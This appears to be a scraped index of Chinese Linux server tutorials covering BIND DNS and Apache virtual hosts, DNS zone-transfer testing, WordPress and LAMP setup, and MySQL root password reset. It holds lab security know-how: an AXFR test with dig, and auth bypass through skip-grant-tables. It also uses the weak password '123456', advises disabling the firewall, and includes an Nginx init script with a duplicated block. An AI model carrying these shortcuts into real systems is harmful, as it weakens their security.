12345678910111213141516zone &quot;zzqa.com&quot; IN &#123; type master; file &quot;zzqa.com&quot;; allow-update &#123; none; &#125;;&#125;;zone &quot;zzqb.com&quot; IN &#123; type master; file &quot;zzqb.com&quot;; allow-update &#123; none; &#125;;&#125;;zone &quot;zzqc.com&quot; IN &#123; type master; file &quot;zzqc.com&quot;; allow-update &#123; none; &#125;;&#125;; (2) 在网站根目录对应创建三个网站的目录，并在每个目录下创建一个人html测试页面。1234567[root@localhost ~]# cd &#x2F;var&#x2F;www&#x2F;html&#x2F;[root@localhost html]# mkdir zzqa[root@localhost html]# mkdir zzqb[root@localhost html]# mkdir zzqc[root@localhost html]# ls1.html 1.php DVWA zzqa zzqb zzqc[root@localhost html]# 1234[root@localhost html]# echo &quot;I am zzqa&quot; &gt; zzqa&#x2F;index.html[root@localhost html]# echo &quot;I am zzqb&quot; &gt; zzqb&#x2F;index.html[root@localhost html]# echo &quot;I am zzqc&quot; &gt; zzqc&#x2F;index.html[root@localhost html]# (3)配置域名解析 首先在/var/named/目录下面拷贝3份模板分别作为解析三个站点的配置文件。1234[root@localhost ~]# cd &#x2F;var&#x2F;named&#x2F;[root@localhost named]# cp named.localhost zzqa.com[root@localhost named]# cp named.localhost zzqb.com[root@localhost named]# cp named.localhost zzqc.com 依次编辑zzqa.com zzqb.com zzqc.com三个解析文件，编辑完成，保存并退出。1[root@localhost named]# vim zzqa.com 1234567891011$TTL 1D@ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @@ IN A 192.168.3.112www IN A 192.168.3.113game IN A 10.1.1.1 1[root@localhost named]# vim zzqb.com 1234567891011$TTL 1D@ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @@ IN A 192.168.3.112www IN A 192.168.3.114game IN A 10.1.1.2 1[root@localhost named]# vim zzqc.com 1234567891011$TTL 1D@ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @@ IN A 192.168.3.112www IN A 192.168.3.115game IN A 10.1.1.3 (4).到此，我们可以重启named服务，测试一下我们配置的域名解析是否成功。1[root@localhost named]# service named restart 重启服务没毛病，说明我们的dns解析配置没出错！ 下面测试：开始测试一下失败了,原因是三个目录没有给可读权限： 因此我们先刚给个可读权限 123[root@localhost named]# ll | grep zzq[root@localhost named]# chmod +r zzq*[root@localhost named]# ll | grep zzq 加完权限一定要重启服务 1[root@localhost named]# service named restart 然后再来测试就OK了，如下图所示 二、然后配置apache三个虚拟主机1.在eth0上面添加3个IP地址123[root@localhost ~]# ifconfig eth0:1 192.168.3.113 netmask 255.255.255.0[root@localhost ~]# ifconfig eth0:2 192.168.3.114 netmask 255.255.255.0[root@localhost ~]# ifconfig eth0:3 192.168.3.115 netmask 255.255.255.0 配置完之后查看一下： 2.修改apache服务配置文件1[root@localhost ~]# vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 在此文件尾部，将下图部分复制三份，中间最好有空行，避免错误也美观。 然后修改为如下内容： 1234567891011121314151617181920212223242526&lt;VirtualHost 192.168.3.113:80&gt; ServerAdmin www.zzqa.com DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;zzqa&#x2F; ServerName 192.168.3.113 ErrorLog logs&#x2F;dummy-host.zzqa.com-error_log CustomLog logs&#x2F;dummy-host.zzqa.com-access_log common&lt;&#x2F;VirtualHost&gt;&lt;VirtualHost 192.168.3.114:80&gt; ServerAdmin www.zzqb.com DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;zzqb&#x2F; ServerName 192.168.3.114 ErrorLog logs&#x2F;dummy-host.zzqb.com-error_log CustomLog logs&#x2F;dummy-host.zzqb.com-access_log common&lt;&#x2F;VirtualHost&gt;&lt;VirtualHost 192.168.3.115:80&gt; ServerAdmin www.zzqc.com DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;zzqc&#x2F; ServerName 192.168.3.115 ErrorLog logs&#x2F;dummy-host.zzqc.com-error_log CustomLog logs&#x2F;dummy-host.zzqc.com-access_log common&lt;&#x2F;VirtualHost&gt; 要注意图2-3里面的网站路径要和下图2-4创建的三个文件夹路径一致* 然后保存退出 3.重启httpd服务1[root@localhost html]# service httpd restart 4.测试，在本机上面将DNS地址改为我们搭建DNS Server的地址 通过web访问三个站点，如下图所示： 没毛病，全部正常！ nice！","categories":[{"name":"Server","slug":"Server","permalink":"http://zzqsmile.top/categories/Server/"}],"tags":[{"name":"LAMP","slug":"LAMP","permalink":"http://zzqsmile.top/tags/LAMP/"}]},{"title":"DNS 域间传送","slug":"Server/2018-03-07-DNS域间传送","date":"2018-03-07T01:00:00.000Z","updated":"2018-05-18T11:25:38.000Z","comments":true,"path":"2018/03/07/Server/2018-03-07-DNS域间传送/","link":"","permalink":"http://zzqsmile.top/2018/03/07/Server/2018-03-07-DNS%E5%9F%9F%E9%97%B4%E4%BC%A0%E9%80%81/","excerpt":"在之前已经讲过DNS server 安装配置，那么今天来讲一下DNS配置中可能存在的安全问题之一——DNS域间传送。 下面我们通过实验来说明一下DNS域间传送安全问题","text":"在之前已经讲过DNS server 安装配置，那么今天来讲一下DNS配置中可能存在的安全问题之一——DNS域间传送。 下面我们通过实验来说明一下DNS域间传送安全问题 step1.还是用我之前的搭建的DNS Server做实验 启动DNS Server(Bind服务)1[root@localhost ~]# service named start 首先我们不对配置文件做任何修改，nslookup测试一下 可以看到默认域间策略是打开的，但有时候是关闭的，我的环境上测试是打开的。 step2.配置DNS域间传送 一般DNS是公司重要的基础性业务，很多公司都会对dns进行主备配置，也可以叫做主从配置，也就是需要dns服务器之间需要数据同步，这个时候就要需要打开域间策略，如下图： 1[root@localhost ~]# vim &#x2F;etc&#x2F;named.conf 配置完后重启服务！！！ 然后再来测试 发现这样配置域间策略是错误的，很危险，原因就是上面配置的allow-transfer &#123; any; &#125;;这行配置打开DNS域间传输没有错，但是里面写的是any;这个就不对了，这样写任何人都可以同步到你的DNS Server数据。正确配置应该写备DNS服务器的地址。 正确配置：我这就一个DNS Server ，就设置为只有本机可以访问的到了。如下图所示： 地址改为127.0.0.1 ，localhost也行，别漏掉最后的分号。 保存并退出，然后记得重启服务。 1234[root@localhost ~]# service named restart停止 named： [确定]启动 named： [确定][root@localhost ~]# 然后再测试 这次就发现Query refused拒绝查询。 扩展1:上面是使用nslookup工具来测试DNS域间传送漏洞，然后再介绍一个dig工具（Linux下）也可以用来测试，测试方法如下：1[root@localhost ~]# dg @192.168.3.112 axfr zzqa.com 扩展2:上面写配置是在/etc/named.conf里面options部分配置，其实也可以在/etc/named.rfc1912.zones自定义的域里面配置，如下图所示： 上面我说了安全配置有两个文件，选择任意一个即可，但是注意的是：/etc/named.rfc1912.zones要比/etc/named.conf优先级要大！！！好了，DNS 域间传送就先讲到这，之后学习到新的东西在继续写。","categories":[{"name":"Server","slug":"Server","permalink":"http://zzqsmile.top/categories/Server/"}],"tags":[{"name":"DNS","slug":"DNS","permalink":"http://zzqsmile.top/tags/DNS/"}]},{"title":"DNS server 安装配置","slug":"Server/2018-03-06-DNS安装配置","date":"2018-03-06T01:00:00.000Z","updated":"2018-05-18T11:24:14.000Z","comments":true,"path":"2018/03/06/Server/2018-03-06-DNS安装配置/","link":"","permalink":"http://zzqsmile.top/2018/03/06/Server/2018-03-06-DNS%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/","excerpt":"1.安装DNS软件包bind","text":"1.安装DNS软件包bind 1[root@localhost ~]# yum -y install bind 2.配置step1.修改主配置文件/etc/named.conf1[root@localhost ~]# vim &#x2F;etc&#x2F;named.conf step2.在自定义配置文件 /etc/named.rfc1912.zones里面添加域1[root@localhost ~]# vim &#x2F;etc&#x2F;named.rfc1912.zones step3. 进入/var/named创建域配置文件，配置域名解析12345[root@localhost etc]# cd &#x2F;var&#x2F;named&#x2F;[root@localhost named]# lsdata dynamic named.ca named.empty named.localhost named.loopback slaves[root@localhost named]# cp named.localhost sec.com[root@localhost named]# vim sec.com 增加权限，并重启服务 12345[root@localhost named]# chmod 644 sec.com[root@localhost ~]# service named restart停止 named：. [确定]启动 named： [确定][root@localhost ~]# 3.测试： nslookup测试 123456789101112131415161718192021222324252627282930C:\\Users\\22303&gt;nslookup默认服务器: public1.114dns.comAddress: 114.114.114.114&gt; server 192.168.3.111默认服务器: [192.168.3.111]Address: 192.168.3.111&gt; www.sec.com服务器: [192.168.3.111]Address: 192.168.3.111名称: www.sec.comAddress: 192.168.3.231&gt; game.sec.com服务器: [192.168.3.111]Address: 192.168.3.111名称: game.sec.comAddress: 10.1.1.1&gt; sec.com服务器: [192.168.3.111]Address: 192.168.3.111名称: sec.comAddress: 192.168.3.111&gt; dig测试 以上配置测试是没有问题的，修改完配置请记得重启服务，如果测试不成功，请检查防火墙，或者直接关闭防火墙，再进行测试","categories":[{"name":"Server","slug":"Server","permalink":"http://zzqsmile.top/categories/Server/"}],"tags":[{"name":"DNS","slug":"DNS","permalink":"http://zzqsmile.top/tags/DNS/"}]},{"title":"Ubuntu LAMP环境下搭建wordpress","slug":"Server/2018-03-05-Ubuntu-wordpress","date":"2018-03-05T01:00:00.000Z","updated":"2020-08-23T13:46:14.536Z","comments":true,"path":"2018/03/05/Server/2018-03-05-Ubuntu-wordpress/","link":"","permalink":"http://zzqsmile.top/2018/03/05/Server/2018-03-05-Ubuntu-wordpress/","excerpt":"在Ubuntu安装完LAMP环境的基础上搭建我们搭建wordpress 一、wordpress网站文件放置","text":"在Ubuntu安装完LAMP环境的基础上搭建我们搭建wordpress 一、wordpress网站文件放置 step1.下载源码1zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ sudo wget https:&#x2F;&#x2F;wordpress.org&#x2F;latest.zip step2.安装解压工具1zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ sudo apt-get install unzip step3. 解压latest.zip1zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ unzip latest.zip step4.移动源码到网站的根目录1zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ sudo mv wordpress &#x2F;var&#x2F;www&#x2F;html&#x2F; step5.更改根目录权限 首先更改目录/var/www/html/wordpress/的所属主以及所属组 1zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ sudo chown -R www-data:www-data &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F; 然后更改目录/var/www/html/wordpress/权限为755 1zzq@ubuntu:&#x2F;var&#x2F;www&#x2F;html$ sudo chmod -R 755 &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F; 二、然后修改Apache配置文件配置虚拟主机： 首先备份配置文件1zzq@ubuntu:&#x2F;$ sudo cp &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf.bak 然后修改配置文件 1zzq@ubuntu:&#x2F;$ sudo vim &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf 修改完配置文件，重启apache服务 1zzq@ubuntu:~$ sudo service apache2 restart 三、数据库配置step1.连接进入数据库1zzq@ubuntu:~$ mysql -u root -p step2. 创建wordpress数据库1mysql&gt; create database wordpress; 四、浏览器访问wordpress配置 web访问http://192\\.168\\.178\\.135，回车就会看到如下页面： 选择语言“简体中文” 点击“现在开始” 填写数据库用户名以及密码 点击提交 点击现在安装，设置一些信息如下图所示 安装成功，返回如下 登录wordpress 成功进入wordpress PS：可能以后会遇到Wordpress不能正常访问，这可能是你的Ubuntu服务器更换了IP。解决办法参考以下博客： 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;zyw19871007&#x2F;article&#x2F;details&#x2F;52775781 五、Wordpress网站更换IP后不能正常访问问题解决 在Ubuntu搭建完wordpress网站之后，由于安装时，里面的域名、IP都已经固定。通过IP访问站点，比如http://192.168.178.135/即打开首页，但是日后系统更换了IP比如改为http://10.0.0.54/，这时候你再通过IP访问，就会发现访问不到了，我出现的现象就是，再url里面输入10.0.0.54访问，结果url里面自己跳成了192.168.178.135就是访问不到，针对这个问题，解决方案如下: 首先进入wordpress数据库，执行以下语句： 1mysql&gt; select * from wp_options where option_value like &#39;%192.168.178.135%&#39;; 找到含有旧ip192.168.178.135的所有字段 然后执行下面语句，使用当前IP()替换之前的IP： 1mysql&gt; update wp_options set option_value&#x3D;replace(option_value,&#39;192.168.178.135&#39;,&#39;10.0.0.54&#39;) where option_value like &#39;%192.168.178.135%&#39;; 此时我们查看以下，已经更新成功 1mysql&gt; select * from wp_options where option_value like &#39;%10.0.0.54%&#39;; 最后最好清一下浏览器缓存，再去访问现在服务器的IP(10.0.0.54)，就会成功访问到了，问题完美解决！","categories":[{"name":"Server","slug":"Server","permalink":"http://zzqsmile.top/categories/Server/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://zzqsmile.top/tags/Ubuntu/"}]},{"title":"Ubuntu Server 14.04配置apt-get源","slug":"Server/2018-03-04-Ubuntu-apt-get源配置","date":"2018-03-04T01:00:00.000Z","updated":"2018-05-18T10:24:54.000Z","comments":true,"path":"2018/03/04/Server/2018-03-04-Ubuntu-apt-get源配置/","link":"","permalink":"http://zzqsmile.top/2018/03/04/Server/2018-03-04-Ubuntu-apt-get%E6%BA%90%E9%85%8D%E7%BD%AE/","excerpt":"1.在安装Ubuntu系统时候我们已经安装了ssh服务，所以直接xshell连接到ubuntu2.下面进行apt-get源配置1注意：我们平时修改配置文件时候一定要先备份下原来的配置文件","text":"1.在安装Ubuntu系统时候我们已经安装了ssh服务，所以直接xshell连接到ubuntu2.下面进行apt-get源配置1注意：我们平时修改配置文件时候一定要先备份下原来的配置文件 备份源： 1zzq@ubuntu:~$ sudo cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bak 配置源： 1zzq@ubuntu:~$ sudo vim &#x2F;etc&#x2F;apt&#x2F;sources.list 首先清空里面得到所有内容然后写上国内比较好的源：中科大源、阿里源 123456789101112131415161718192021222324#中科大源：deb [http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;) trusty main restricted universe multiversedeb [http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;) trusty-security main restricted universe multiversedeb [http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;) trusty-updates main restricted universe multiversedeb [http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;) trusty-proposed main restricted universe multiversedeb [http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;) trusty-backports main restricted universe multiversedeb-src [http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;) trusty main restricted universe multiversedeb-src [http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;) trusty-security main restricted universe multiversedeb-src [http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;) trusty-updates main restricted universe multiversedeb-src [http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;) trusty-proposed main restricted universe multiversedeb-src [http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;debian.ustc.edu.cn&#x2F;ubuntu&#x2F;) trusty-backports main restricted universe multiverse#阿里源：deb [http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;) trusty main multiverse restricted universedeb [http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;) trusty-backports main multiverse restricted universedeb [http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;) trusty-proposed main multiverse restricted universedeb [http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;) trusty-security main multiverse restricted universedeb [http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;) trusty-updates main multiverse restricted universedeb-src [http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;) trusty main multiverse restricted universedeb-src [http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;) trusty-backports main multiverse restricted universedeb-src [http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;) trusty-proposed main multiverse restricted universedeb-src [http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;) trusty-security main multiverse restricted universedeb-src [http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;](http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F;) trusty-updates main multiverse restricted universe 升级源： 首先更新软件列表 1zzq@ubuntu:~$ sudo apt-get update 然后更新软件 1zzq@ubuntu:~$ sudo apt-get upgrade 此时ubuntu源配置就OK了！","categories":[{"name":"Server","slug":"Server","permalink":"http://zzqsmile.top/categories/Server/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://zzqsmile.top/tags/Ubuntu/"}]},{"title":"Ubuntu server LAMP环境搭建","slug":"Server/2018-03-03-Ubuntu-LAMP","date":"2018-03-03T01:00:00.000Z","updated":"2020-08-23T12:42:38.093Z","comments":true,"path":"2018/03/03/Server/2018-03-03-Ubuntu-LAMP/","link":"","permalink":"http://zzqsmile.top/2018/03/03/Server/2018-03-03-Ubuntu-LAMP/","excerpt":"1.Linux我们已经安装完了","text":"1.Linux我们已经安装完了 2.安装apache21zzq@ubuntu:~$ sudo apt-get install apache2 安装完之后可以查看下apache2 服务状态 1zzq@ubuntu:~$ service apache2 status 如下图所示，正在运行 此时我们查看下IP地址为：192.168.178.135 然后我们用浏览器访问以下这个主机 看到上图所示说明我们的apache服务已经安装完成 2-1.安装apache2与php5的交互模块1zzq@ubuntu:~$ sudo apt-get install libapache2-mod-php5 安装完成！返回如下图所示： 2-2.安装apache2与mysql的交互1zzq@ubuntu:~$ sudo apt-get install libapache2-mod-auth-mysql 3.安装mysql服务1zzq@ubuntu:~$ sudo apt-get install mysql-client mysql-server 此时中间会出现弹窗，让你设置mysql的密码，设置一个密码然后按Tab键跳转到 回车即可 安装完成 4.安装php5 安装php5 1zzq@ubuntu:~$ sudo apt-get install php5 安装 php5-gd1zzq@ubuntu:~$ sudo apt-get install php5-gd 安装php5-mysql 1zzq@ubuntu:~$ sudo apt-get install php5-mysql 至此，Ubuntu下LAMP环境已经设置完毕！ 下面我们可以登录下mysql数据库，下面在是在数据库中的一些基本操作 0x01.登录mysql数据库1zzq@ubuntu:~$ sudo mysql -u root -p 0x02.查看所有数据库1mysql&gt; show databases; 0x03.切换到mysql数据库1mysql&gt; use mysql; 0x04.查看mysql数据库中的表1mysql&gt; show tables; 0x05.查看表的结构1mysql&gt; desc user; 0x06.退出数据库1mysql&gt; exit;","categories":[{"name":"Server","slug":"Server","permalink":"http://zzqsmile.top/categories/Server/"}],"tags":[{"name":"LAMP","slug":"LAMP","permalink":"http://zzqsmile.top/tags/LAMP/"}]},{"title":"Linux下MYSQL忘记密码怎么办？","slug":"Database/2018-02-02-mysql密码找回","date":"2018-02-02T01:00:00.000Z","updated":"2019-12-08T08:40:56.000Z","comments":true,"path":"2018/02/02/Database/2018-02-02-mysql密码找回/","link":"","permalink":"http://zzqsmile.top/2018/02/02/Database/2018-02-02-mysql%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/","excerpt":"以下将是重置MySQL密码教程本教程环境： 12345[root@localhost ~]# cat &#x2F;etc&#x2F;redhat-release CentOS release 6.5 (Final)[root@localhost ~]# mysql --versionmysql Ver 14.14 Distrib 5.1.73, for redhat-linux-gnu (x86_64) using readline 5.1[root@localhost ~]# step1.停止在运行的mysql服务1[root@localhost ~]# service mysqld stop","text":"以下将是重置MySQL密码教程本教程环境： 12345[root@localhost ~]# cat &#x2F;etc&#x2F;redhat-release CentOS release 6.5 (Final)[root@localhost ~]# mysql --versionmysql Ver 14.14 Distrib 5.1.73, for redhat-linux-gnu (x86_64) using readline 5.1[root@localhost ~]# step1.停止在运行的mysql服务1[root@localhost ~]# service mysqld stop step2.编辑配置文件etc/my.cnf ，添加如下图所示内容：123[root@localhost ~]# vim &#x2F;etc&#x2F;my.cnf skip-grant-tables 保存退出！ step3.重启服务1[root@localhost ~]# service mysqld restart step4.进如mysql数据库，修改密码12345678[root@localhost ~]# mysql -urootmysql&gt; show databases;mysql&gt; use mysqlmysql&gt; show tables;mysql&gt; update user set password&#x3D;PASSWORD(&#39;123456&#39;) where user&#x3D;&#39;root&#39;;MySQL&gt; flush privileges; #刷新权限mysql&gt; quit 注：update user set password=PASSWORD(&#39;newpassword&#39;) where user=&#39;root&#39;可以修改密码但是在mysql 5.7版本中不存在password字段，所以我们要用下面命令修改：update user set authentication_string=password(&#39;123456&#39;) where user=&#39;root&#39;; step5.删除 step2 在 etc/my.cnf 加入的skip-grant-tables，然后保存退出，重启服务！(本人测试，必须重启服务！)","categories":[{"name":"Database","slug":"Database","permalink":"http://zzqsmile.top/categories/Database/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://zzqsmile.top/tags/mysql/"}]},{"title":"MySQL数据库information_schema常用表结构","slug":"Database/2018-02-01-mysql-information_schema","date":"2018-02-01T01:00:00.000Z","updated":"2018-11-26T06:41:24.000Z","comments":true,"path":"2018/02/01/Database/2018-02-01-mysql-information_schema/","link":"","permalink":"http://zzqsmile.top/2018/02/01/Database/2018-02-01-mysql-information_schema/","excerpt":"重要的表结构","text":"重要的表结构","categories":[{"name":"Database","slug":"Database","permalink":"http://zzqsmile.top/categories/Database/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://zzqsmile.top/tags/mysql/"}]},{"title":"CentOS 软件安装之Nginx源码安装","slug":"Linux/2018-01-08-Nginx源码安装","date":"2018-01-08T01:00:00.000Z","updated":"2018-05-19T10:33:12.000Z","comments":true,"path":"2018/01/08/Linux/2018-01-08-Nginx源码安装/","link":"","permalink":"http://zzqsmile.top/2018/01/08/Linux/2018-01-08-Nginx%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85/","excerpt":"step1.首先wget下载源码包如下图：鼠标右击复制链接地址","text":"step1.首先wget下载源码包如下图：鼠标右击复制链接地址 Mainline version：Mainline 是 Nginx 目前主力在做的版本，可以说是开发版 Stable version：最新稳定版，生产环境上建议使用的版本 Legacy versions：遗留的老版本的稳定版 1# wget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.14.0.tar.gz step2.解压nginx-1.14.0.tar.gz包1# tar -zxvf nginx-1.14.0.tar.gz step3.进入解压的文件夹安装nginx123456[root@localhost soft_tar]# lsnginx-1.14.0 nginx-1.14.0.tar.gz[root@localhost soft_tar]# cd nginx-1.14.0[root@localhost nginx-1.14.0]# lsauto CHANGES CHANGES.ru conf configure contrib html LICENSE man README src[root@localhost nginx-1.14.0]# .&#x2F;configure ./configure: error: C compiler cc is not found 错误1：未找到C编辑器，报错信息如下：解决办法： 1[root@localhost ~]# yum -y install gcc gcc-c++ 然后回去继续安装配置 1[root@localhost nginx-1.14.0]# .&#x2F;configure ./configure: error: the HTTP rewrite module requires the PCRE library.You can either disable the module by using –without-http_rewrite_moduleoption, or install the PCRE library into the system, or build the PCRE librarystatically from the source with nginx by using –with-pcre= option. 错误2：需要pcre模块，报错信息如上图：解决办法： 1[root@localhost ~]# yum -y install pcre-devel 然后回去继续安装配置 1[root@localhost nginx-1.14.0]# .&#x2F;configure 又出现一个错误： ./configure: error: the HTTP gzip module requires the zlib library.You can either disable the module by using –without-http_gzip_moduleoption, or install the zlib library into the system, or build the zlib librarystatically from the source with nginx by using –with-zlib= option. 错误3：需要zlib库，报错信息如上图：上面这个错误是说需要zlib库解决办法： 12[root@localhost ~]# yum install -y zlib-devel 然后回去继续安装配置 1[root@localhost nginx-1.14.0]# .&#x2F;configure 这次没有错误： 12[root@localhost nginx-1.14.0]# make[root@localhost nginx-1.14.0]# make install 上面两步没有错误就安装成功了！ web访问Nginx,看到下图就安装成功了。 开始安装完成后，在centos上面测试下是没问题的，web访问也没问题，但是在windows浏览器访问却出错访问不了，后来想想查看下iptables，把iptable关掉再去访问就没有问题。 本机测试： 关闭iptables: 1[root@localhost ~]# service iptables stop step4:把nginx添加到系统服务中，使其可以使用service nginx start/stop/restart等。以前启动/停止/查看状态某个服务的时候，我们常用的方法是service [服务名] [动作] 123[root@localhost ~]# service nginx statusnginx: 未被识别的服务[root@localhost ~]# 可是如上，nginx未被识别，下面再解决下这个问题 1[root@localhost sbin]# vim nginx vim编辑(创建)nginx脚本，写入以下内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!&#x2F;bin&#x2F;bash## chkconfig: - 85 15# description: Nginx is a World Wide Web server.# processname: nginxnginx&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginxconf&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.confcase $1 instart)echo -n &quot;Starting Nginx&quot;$nginx -c $confecho &quot; done&quot;;;stop)echo -n &quot;Stopping Nginx&quot;killall -9 nginxecho &quot; done&quot;;;#!&#x2F;bin&#x2F;bash## chkconfig: - 85 15# description: Nginx is a World Wide Web server.# processname: nginxnginx&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginxconf&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.confcase $1 instart)echo -n &quot;Starting Nginx&quot;$nginx -c $confecho &quot; done&quot;;;stop)echo -n &quot;Stopping Nginx&quot;killall -9 nginxecho &quot; done&quot;;;test)$nginx -t -c $conf;;reload)echo -n &quot;Reloading Nginx&quot;ps auxww | grep nginx | grep master | awk &#39;&#123;print $2&#125;&#39; | xargs kill -HUPecho &quot; done&quot;;;restart)$0 stop$0 start;;show)ps -aux|grep nginx;;*)echo -n &quot;Usage: $0 &#123;start|restart|reload|stop|test|show&#125;&quot;;;esac","categories":[{"name":"Linux","slug":"Linux","permalink":"http://zzqsmile.top/categories/Linux/"}],"tags":[{"name":"linux之技能学习","slug":"linux之技能学习","permalink":"http://zzqsmile.top/tags/linux%E4%B9%8B%E6%8A%80%E8%83%BD%E5%AD%A6%E4%B9%A0/"}]},{"title":"VMware Workstation 网络连接问题","slug":"Linux/2018-01-07-vmware","date":"2018-01-07T01:00:00.000Z","updated":"2018-05-17T15:01:22.000Z","comments":true,"path":"2018/01/07/Linux/2018-01-07-vmware/","link":"","permalink":"http://zzqsmile.top/2018/01/07/Linux/2018-01-07-vmware/","excerpt":"不知道和我一样的小白有没有和我一样，有时候打开虚拟机，用的是桥接方式莫名其妙的上不去网，然后就在网上狂搜一些关于CentOS,Kali，Ubuntu上不去网，网络配置等等一些文章，然后不停的改配置文件，但是最后还是无法上网，如果有这样的苦恼，请来看看我分享的这篇文章，我也是突然发现的这个问题","text":"不知道和我一样的小白有没有和我一样，有时候打开虚拟机，用的是桥接方式莫名其妙的上不去网，然后就在网上狂搜一些关于CentOS,Kali，Ubuntu上不去网，网络配置等等一些文章，然后不停的改配置文件，但是最后还是无法上网，如果有这样的苦恼，请来看看我分享的这篇文章，我也是突然发现的这个问题 虚拟机的系统桥接应该是通过电脑的有线网卡和路由器相连接的，因为桥接本来就是独立出来和自己的主机位于同一局域网内，也就是说虚拟机和自己主机（windows）都是通过路由器分配的IP,即主机和虚拟机两台电脑用的同一路由器分配的IP,解释一堆不知道大家懂我想表达的意思没有. 将网卡自动识别改为有线或者无线网卡，即我们手动选择： 主要就是这个地方，一般情况下选择的是自动，自动就是他自己识别，但是VMware这个自动并不好使，那么还不如自己手动如上图所示，选择电脑的有线网卡，选择好之后，就点击下面应用，然后再去开启虚拟机就能上网了，在此基础之上，如果还不能上网，那么再通过配置文件寻找原因，不要盲目去修改配置文件-注：Wireless-AC 3160 即自动选项下面的那个是无线网卡- 